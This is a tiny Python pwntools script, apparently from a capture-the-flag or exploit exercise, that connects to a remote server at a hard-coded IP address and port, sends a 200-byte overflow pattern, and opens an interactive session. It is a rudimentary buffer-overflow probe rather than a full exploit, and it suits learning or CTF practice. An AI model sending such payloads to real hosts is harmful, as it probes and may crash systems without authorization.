#!/usr/bin/python3

from pwn import *

p = remote('34.150.138.102', 5000)
payload = b'C' * 200

p.sendline(payload)
p.interactive()
